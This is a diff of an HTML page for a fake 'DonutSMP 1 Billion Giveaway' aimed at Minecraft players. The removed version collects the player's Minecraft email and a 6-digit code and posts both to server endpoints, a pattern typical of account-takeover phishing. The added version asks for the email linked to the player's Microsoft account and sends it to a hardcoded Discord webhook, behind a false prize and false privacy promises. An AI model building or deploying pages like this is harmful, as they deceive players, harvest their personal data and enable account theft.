@@ -1,67 +1,179 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Biggest DonutSMP Giveaway Ever</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {font-family: Arial; background: #ff69b4; color: white; text-align: center; padding: 40px; min-height: 100vh; display: flex; align-items: center; justify-content: center;}
-        .box {background: rgba(0,0,0,0.3); padding: 40px; border-radius: 20px; max-width: 500px; width: 100%;}
-        input, button {width: 100%; padding: 16px; margin: 12px 0; font-size: 20px; border: none; border-radius: 12px;}
-        button {background: #00ff9d; color: black; font-weight: bold; cursor: pointer;}
-        h1 {font-size: 3em;}
-        #codeStep, #thanks {display: none;}
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DonutSMP 1 Billion Giveaway</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --purple: #9d4edd;
+      --dark: #121212;
+      --light: #f4f4f9;
+    }
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      color: var(--light);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 800px;
+      background: rgba(255,255,255,0.05);
+      padding: 40px 30px;
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    h1 {
+      font-size: 3.5rem;
+      background: linear-gradient(90deg, #ff6b6b, #9d4edd);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 0 0 20px;
+    }
+    p {
+      font-size: 1.2rem;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+    .btn {
+      background: var(--purple);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 1.3rem;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: 0.3s;
+      font-weight: 600;
+    }
+    .btn:hover { transform: scale(1.05); background: #c06aff; }
+
+    .step { display: none; }
+    .step.active { display: block; animation: fadeIn 0.6s; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    input[type="email"], input[type="text"] {
+      width: 100%;
+      max-width: 400px;
+      padding: 15px;
+      margin: 15px 0;
+      border-radius: 10px;
+      border: none;
+      font-size: 1.1rem;
+    }
+    .success {
+      font-size: 2rem;
+      color: #4ade80;
+      margin-top: 40px;
+    }
+  </style>
 </head>
 <body>
-<div class="box">
-    <h1>DonutSMP<br>BIGGEST GIVEAWAY EVER</h1>
-    
-    <div id="emailStep">
-        <p>Enter your Minecraft email to join:</p>
-        <input type="email" id="email" placeholder="example@gmail.com" required>
-        <button onclick="submitEmail()">Submit Email</button>
+  <div class="container">
+
+    <!-- Step 1: Intro -->
+    <div id="step1" class="step active">
+      <h1>1,000,000,000 Giveaway</h1>
+      <p>
+        DonutSMP has given us so much. Now we're giving back in the biggest way possible.<br><br>
+        We're giving away <strong>ONE BILLION</strong> to ONE lucky player.<br>
+        The largest giveaway in DonutSMP history.
+      </p>
+      <button class="btn" onclick="showStep('step2')">JOIN THE EVENT</button>
     </div>
 
-    <div id="codeStep">
-        <p>Check your email! Enter the 6-digit code here:</p>
-        <input type="text" id="code" maxlength="6" placeholder="123456">
-        <button onclick="submitCode()">Submit Code</button>
+    <!-- Step 2: Enter Email -->
+    <div id="step2" class="step">
+      <h2>Step 1 – Enter your email</h2>
+      <p>We will ONLY use this email to contact you if you win.<br>
+      It must be the email linked to your Minecraft/Microsoft account.</p>
+      <input type="email" id="email" placeholder="you@example.com" required />
+      <br/>
+      <button class="btn" onclick="submitEmail()">Submit Email & Send Code</button>
     </div>
 
-    <div id="thanks">
-        <h2>Thank You!</h2>
-        <p>We will email you if you win the giveaway!</p>
+    <!-- Step 3: Enter Code -->
+    <div id="step3" class="step">
+      <h2>Step 2 – Verify your email</h2>
+      <p>We just sent a 6-digit code to your inbox.<br>Check spam/junk if you don't see it.</p>
+      <input type="text" id="code" placeholder="Enter 6-digit code" maxlength="6" />
+      <br/>
+      <button class="btn" onclick="verifyCode()">Verify Code</button>
     </div>
-</div>
 
-<script>
-let currentEmail = "";
+    <!-- Step 4: Success -->
+    <div id="step4" class="step">
+      <h1 class="success">You're In!</h1>
+      <p>You are now officially entered into the <strong>1 Billion Giveaway</strong>.<br><br>
+      We will email you if you win. Good luck!</p>
+    </div>
 
-async function submitEmail() {
-    const email = document.getElementById("email").value.trim();
-    if (!email.includes("@")) return alert("Enter a real email");
-    
-    currentEmail = email;
-    const res = await fetch("/send_email", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({email})});
-    const data = await res.json();
-    
-    if (data.next === "ask_code") {
-        document.getElementById("emailStep").style.display = "none";
-        document.getElementById("codeStep").style.display = "block";
-    } else {
-        alert("Error, try again");
+  </div>
+
+  <script>
+    // YOUR WEBHOOK (already inserted)
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1439990429226369166/lJgEK_CeiR5qkbvXsFCLwmHH7jVoS_wx0IT97nPMyvPXnbltCKfV1b27urEmg-DnWJwr";
+
+    function showStep(id) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
     }
-}
 
-async function submitCode() {
-    const code = document.getElementById("code").value.trim();
-    if (code.length !== 6) return alert("Code must be 6 digits");
-    
-    await fetch("/send_code", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({email: currentEmail, code})});
-    
-    document.getElementById("codeStep").style.display = "none";
-    document.getElementById("thanks").style.display = "block";
-}
-</script>
+    async function submitEmail() {
+      const email = document.getElementById('email').value.trim();
+      if (!email || !email.includes('@')) return alert("Please enter a valid email");
+
+      const code = Math.floor(100000 + Math.random() * 900000).toString();
+
+      localStorage.setItem('pendingCode_' + btoa(email), code);
+      localStorage.setItem('pendingEmail', email);
+
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `**New 1 Billion Giveaway Entry**\nEmail: **${email}**\nVerification code: **${code}**\n\nManually email this code to them!`
+        })
+      });
+
+      alert("Code sent! Check your email (including spam folder).");
+      showStep('step3');
+    }
+
+    function verifyCode() {
+      const entered = document.getElementById('code').value.trim();
+      const email = localStorage.getItem('pendingEmail');
+      const correct = localStorage.getItem('pendingCode_' + btoa(email));
+
+      if (entered === correct) {
+        fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**VERIFIED ENTRY**\nEmail: **${email}** is officially entered into the 1 Billion giveaway!`
+          })
+        });
+
+        localStorage.removeItem('pendingCode_' + btoa(email));
+        localStorage.removeItem('pendingEmail');
+
+        showStep('step4');
+      } else {
+        alert("Incorrect code. Try again or restart the process.");
+      }
+    }
+  </script>
 </body>
 </html>
